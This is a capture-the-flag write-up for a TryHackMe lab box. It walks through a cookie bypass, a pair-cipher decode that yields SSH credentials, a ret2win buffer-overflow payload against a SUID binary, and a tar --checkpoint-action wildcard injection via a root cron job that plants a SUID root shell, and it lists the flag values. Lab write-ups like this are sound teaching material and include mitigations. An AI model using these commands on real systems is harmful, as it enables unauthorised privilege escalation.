# THM — Anonymous Playground

```
 █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗██╗   ██╗███╗   ███╗ ██████╗ ██╗   ██╗███████╗
██╔══██╗████╗  ██║██╔═══██╗████╗  ██║╚██╗ ██╔╝████╗ ████║██╔═══██╗██║   ██║██╔════╝
███████║██╔██╗ ██║██║   ██║██╔██╗ ██║ ╚████╔╝ ██╔████╔██║██║   ██║██║   ██║███████╗
██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║  ╚██╔╝  ██║╚██╔╝██║██║   ██║██║   ██║╚════██║
██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║   ██║   ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║
╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
██████╗ ██╗      █████╗ ██╗   ██╗ ██████╗ ██████╗  ██████╗ ██╗   ██╗███╗   ██╗██████╗ 
██╔══██╗██║     ██╔══██╗╚██╗ ██╔╝██╔════╝ ██╔══██╗██╔═══██╗██║   ██║████╗  ██║██╔══██╗
██████╔╝██║     ███████║ ╚████╔╝ ██║  ███╗██████╔╝██║   ██║██║   ██║██╔██╗ ██║██║  ██║
██╔═══╝ ██║     ██╔══██║  ╚██╔╝  ██║   ██║██╔══██╗██║   ██║██║   ██║██║╚██╗██║██║  ██║
██║     ███████╗██║  ██║   ██║   ╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝
                            TryHackMe — Medium
```

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#tools-used)
- [TL;DR](#tldr)
- [Introduction](#introduction)
- [Recon](#recon)
- [Foothold](#foothold)
- [Shell / Initial Access](#shell--initial-access)
- [Escalation Path](#escalation-path)
- [Exploitation](#exploitation)
- [Rabbit Holes](#rabbit-holes)
- [Flag](#flag)
- [Mitigations](#mitigations)
- [Key Takeaway](#key-takeaway)
- [If I Did It Again](#if-i-did-it-again)
- [Changelog](#changelog)

---

## Progress Checklist

- [x] Port scan — 22 (SSH), 80 (HTTP)
- [x] Found `operatives.php` and a page gated behind an `access` cookie
- [x] Set `access=granted` → revealed a hidden directory `/zYdHuAKjP/`
- [x] That page served an encoded string; decoded a custom pair-cipher to `MAGNA IS AN ELEPHANT`
- [x] SSH in as `magna` with password `magnaisanelephant`
- [x] Read the first flag (magna)
- [x] Found a SUID-root binary `hacktheworld` using `gets()` — stack buffer overflow
- [x] Reversed it: a `call_bash` function does `setuid(1337)` + `system("/bin/sh")`
- [x] Ret2win into `call_bash` (with a `ret` gadget for stack alignment) → shell as `spooky` (uid 1337)
- [x] Read the second flag (spooky)
- [x] Found a root cron job running `tar -zcf ... *` in a writable directory
- [x] tar wildcard injection (`--checkpoint-action`) → SUID root bash → root flag

---

## Tools Used

| Tool | Purpose |
|---|---|
| RustScan / Nmap | Port and service discovery |
| feroxbuster | Web content discovery |
| curl | Driving the cookie-gated web pages |
| tr / custom analysis | Breaking the pair-cipher |
| ssh | Logging in as `magna` |
| readelf / objdump / nm / strings / gdb | Reversing the SUID binary |
| python3 | Building the overflow payload |
| GNU tar (wildcard injection) | Root privilege escalation |

---

## TL;DR

Anonymous Playground hides a directory (`/zYdHuAKjP/`) behind an `access=granted` cookie. That page shows an encoded string that decodes, via a custom "add the two letters of each pair" cipher, to `MAGNA IS AN ELEPHANT` — which is the SSH login `magna : magnaisanelephant`. In magna's home sits a SUID-root binary, `hacktheworld`, that reads input with `gets()`. It contains a convenient `call_bash` function that calls `setuid(1337)` then `system("/bin/sh")`, so a 72-byte overflow that returns into `call_bash` (preceded by a bare `ret` gadget to fix stack alignment) drops a shell as `spooky` (uid 1337). Finally, root runs a per-minute cron job `cd /home/spooky && tar -zcf /var/backups/spooky.tgz *` in a directory spooky can write to — a textbook tar wildcard injection with `--checkpoint-action` yields a SUID root shell.

---

## Introduction

Anonymous Playground is a medium Linux box that strings together three distinct skills, one per stage: a web puzzle (a cookie gate plus a home-made cipher), a binary exploitation step (a classic `gets()` overflow into a built-in `call_bash` win function), and a Linux privesc classic (tar wildcard injection from a root cron job). It's a good all-rounder because none of the three stages is hard on its own, but each uses a different muscle, and the binary stage even has a stack-alignment wrinkle that teaches the `ret`-gadget trick.

---

## Recon

### Port Scan

```bash
rustscan -a 10.48.175.152 --ulimit 5000 -b 500 -t 1500 -- -Pn -sV -sC
```

Just two ports: 22 (OpenSSH) and 80 (HTTP). All the early game is on the web server.

### Web content discovery

```bash
feroxbuster -u http://10.48.175.152/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt
```

The site is themed around "Anonymous"/"operatives". `operatives.php` lists operative names, and the landing content reports: *"You have not been **granted** access. Access denied."* The emphasis on **granted** is a hint at a cookie value.

---

## Foothold

### The access cookie

Setting a cookie named `access` to `granted` flipped the page from "Access denied" to "Access granted", and revealed a hidden directory and an encoded string:

```bash
curl -s -b 'access=granted' http://10.48.175.152/zYdHuAKjP/index.php
```

```html
<p class='text-center'>Access granted. <br />
Well done getting this far.  But can you go further? <br /><br />
<span style='font-size: 30px;'>hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN</span>
```

### Breaking the cipher

The string is made of alternating lowercase/uppercase letters in pairs. base64, ROT13 (`tr A-Za-z N-ZA-Mn-za-m`) and case-swap (`tr A-Za-z a-zA-Z`) all produced garbage. The structure — pairs like `hE`, `zA`, `dC` — was the clue. Mapping each letter to 1–26 and **adding the two letters of a pair** (mod 26, 1 = A) decodes it:

```
h+E = 8+5  = 13 → M
z+A = 26+1 = 27 → 1  → A
d+C = 4+3  = 7  → G
f+H = 6+8  = 14 → N
z+A = 26+1 = 27 → 1  → A      left half  = MAGNA
```

Applying the same to the right half yields `ISANELEPHANT`. Full message: **`MAGNA IS AN ELEPHANT`**. `magna` is one of the operative names from `operatives.php`.

### SSH

`magna`/`elephant` failed. The decoded phrase itself, lowercased and with the spaces removed, is the password:

```bash
ssh magna@10.48.175.152     # password: magnaisanelephant
magna@ip-10-48-151-229:~$ id
uid=1001(magna) gid=1001(magna) groups=1001(magna)
```

```bash
magna@...:~$ cat flag.txt
9184177ecaa83073cbbf36f1414cc029
```

First flag.

---

## Shell / Initial Access

magna's home also held a note and a binary:

```bash
magna@...:~$ ls
flag.txt  hacktheworld  note_from_spooky.txt
magna@...:~$ cat note_from_spooky.txt
# ...practicing my skills in C... See if you can break it!  — Spooky
magna@...:~$ ls -la hacktheworld
-rwsr-xr-x 1 root root 8528 Jul 10  2020 hacktheworld
```

`-rwsr-xr-x root root` — SUID root. Anything it does with root privileges is worth attacking.

### Reversing

```bash
file hacktheworld
# setuid ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
readelf -s hacktheworld | grep -iE 'gets|system|setuid'
#  UND gets ... UND system ... UND setuid
```

`gets()` + `system()` + `setuid()` is the whole story. `main` reads into a 64-byte stack buffer with `gets()` (no bounds check), and there is a separate function, `call_bash`, that is never called by `main`:

```
0000000000400657 <call_bash>:
  ...puts() banners...
  4006bf:  mov    $0x539,%edi      ; setuid(0x539 = 1337)
  4006c4:  callq  <setuid@plt>
  4006c9:  lea    ...,%rdi         ; "/bin/sh"
  4006d0:  callq  <system@plt>
```

So `call_bash` sets the uid to 1337 and spawns `/bin/sh`. This is a ret2win: overflow `main`'s buffer and return into `call_bash`.

### Finding the offset

The buffer is at `-0x40(%rbp)` (64 bytes), plus 8 for the saved RBP = **72 bytes** before the saved return address. A first attempt returning straight into `call_bash` crashed inside `do_system` with a SIGSEGV:

```
Program received signal SIGSEGV in do_system (line=0x400803 "/bin/sh")
```

That crash in `do_system` is the classic **movaps stack-alignment** fault: `system()`/glibc needs a 16-byte-aligned stack. Prepending a bare `ret` gadget (`0x40070f`, the `retq` at the end of `main`) re-aligns the stack before `call_bash` runs.

---

## Escalation Path

Two escalations in sequence:

1. **magna → spooky (uid 1337)** via the SUID binary overflow (ret2win into `call_bash`, which does `setuid(1337)`).
2. **spooky → root** via a root cron job that runs `tar` with a shell wildcard in a directory spooky controls.

---

## Exploitation

### magna → spooky

Payload: 72 filler bytes, a `ret` gadget for alignment, then the address of `call_bash`. Keeping stdin open (`cat`) after sending it lets me type into the spawned shell:

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + (0x40070f).to_bytes(8,'little') + (0x400657).to_bytes(8,'little') + b'\n')" > /tmp/p
(cat /tmp/p; sleep 6; cat) | ./hacktheworld
```

```
We are Anonymous. ...
id
uid=1337(spooky) gid=1001(magna) groups=1001(magna)
cat /home/spooky/flag.txt
69ee352fb139c9d0699f6f399b63d9d7
python3 -c 'import pty; pty.spawn("/bin/bash")'
spooky@ip-10-48-151-229:~$
```

Second flag, and a proper TTY as spooky.

### spooky → root (tar wildcard injection)

Hunting for scheduled jobs:

```bash
grep -ri tar /etc/cron* 2>/dev/null
# /etc/crontab: */1 *  * * *  root  cd /home/spooky && tar -zcf /var/backups/spooky.tgz *
```

Every minute, **root** runs `tar -zcf ... *` from `/home/spooky`, and spooky can write files there. GNU `tar`'s `--checkpoint`/`--checkpoint-action` options can be smuggled in as filenames, because the `*` expands to every file in the directory and `tar` parses filenames that look like flags as options:

```bash
cd /home/spooky
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

When the cron fires, root's `tar * ` becomes `tar ... --checkpoint=1 --checkpoint-action=exec=sh shell.sh ...`, running `shell.sh` as root. One minute later:

```bash
ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root 1183448 ... /tmp/rootbash
/tmp/rootbash -p
rootbash-5.0# id
uid=1337(spooky) ... euid=0(root) egid=0(root) groups=0(root)
rootbash-5.0# cat /root/flag.txt
bc55a426e98deb673beabda50f24ce66
```

Root.

---

## Rabbit Holes

**base64 / ROT13 / case-swap on the cipher.** The encoded string *looks* like it could be base64 (mixed case, even length), and the pairs look like they might be a simple substitution. base64 produced binary garbage, ROT13 and case-swap produced more nonsense. The structure (letter *pairs*) was the real hint — the cipher combines two letters into one, it doesn't just remap single letters.

**`magna` / `elephant` as the SSH password.** The decode says "MAGNA IS AN ELEPHANT", and the obvious first guess is username `magna`, password `elephant`. That fails. The password is the *whole* phrase, lowercased and de-spaced: `magnaisanelephant`. The clue is the entire sentence, not the last word.

**Returning straight into `call_bash`.** The first overflow jumped directly to `call_bash` and crashed in `do_system` with a SIGSEGV. It looks like the exploit is wrong, but the address and offset were fine — it's a 16-byte stack-alignment requirement in modern glibc's `system()`. A single `ret` gadget before the win function fixes it. Worth recognising the `do_system` crash signature so you don't waste time re-checking the offset.

**Feeding input without keeping stdin open.** Piping just the payload (`cat /tmp/p | ./hacktheworld`) spawns `/bin/sh` and then immediately hits EOF, so the shell exits before you can type. The fix is `(cat /tmp/p; cat) | ./hacktheworld` (or a `sleep`), which keeps stdin attached to the spawned shell.

---

## Flag

| Flag | Value |
|---|---|
| magna (flag 1) | `9184177ecaa83073cbbf36f1414cc029` |
| spooky (flag 2) | `69ee352fb139c9d0699f6f399b63d9d7` |
| root (flag 3) | `bc55a426e98deb673beabda50f24ce66` |

---

## Mitigations

**Cookie-based access control.** Gating content on a client-set cookie (`access=granted`) is no control at all — the client sets its own cookies. Access decisions must be made server-side against an authenticated session.

**Security through obscurity.** The hidden directory name and the home-made cipher only slow an attacker down; they don't stop one. A random path and a custom encoding are not secrets once the response hands them to you.

**`gets()` in a SUID binary.** `gets()` has no bounds checking and cannot be used safely — it's been removed from the C standard. The binary should use `fgets()` with a length, be compiled with a stack canary and non-executable stack (it was, but the win function made that irrelevant), and above all should not ship with a `call_bash`/`setuid(1337)+system` function. SUID binaries should be minimal and audited.

**tar wildcard in a root cron job.** `tar ... *` run as root in a user-writable directory is a well-known injection. Never use shell globs in privileged scripts: pin an explicit file list, `cd` into a directory the target user cannot write, or use `tar`'s `--` and absolute paths. Better, run the backup from a directory users can't drop files into.

---

## Key Takeaway

Each stage rewards recognising a *pattern* rather than brute force. The cipher's pairs of letters said "two things combine into one" — once you try adding the pair, it falls out immediately. The SUID binary's `gets()` + an unused `call_bash` function is the textbook ret2win setup, and the `do_system` SIGSEGV is the tell-tale sign of a stack-alignment problem that one `ret` gadget fixes. And `tar ... *` in a root cron is one of the most reliable Linux escalations there is — whenever a privileged job uses a wildcard in a directory you can write to, reach for `--checkpoint-action`.

The meta-lesson: when a decoded hint gives you a sentence, try the whole sentence as the credential, not just the word that looks like a password.

---

## If I Did It Again

On the cipher, I'd look at the pair structure first instead of reflexively trying base64/ROT13 — the alternating-case pairs are the entire clue, and "combine each pair" is the obvious next hypothesis.

On the binary, I'd add a `ret` gadget to the ret2win chain from the start. On modern glibc, a `system()`-based win function crashing in `do_system` is almost always the movaps alignment issue, not a wrong offset — recognising that would have saved the detour through gdb.

On the cron, `grep -ri tar /etc/cron*` immediately after getting the spooky shell pointed straight at the wildcard job; I'd run the scheduled-task checks before anything else once I had a foothold as the user the cron operates on.

---

## Changelog

| Version | Date | Notes |
|---|---|---|
| 1.0 | 2026-11-16 | Initial writeup |

---

<a name="top"></a>[↑ Back to top](#table-of-contents)
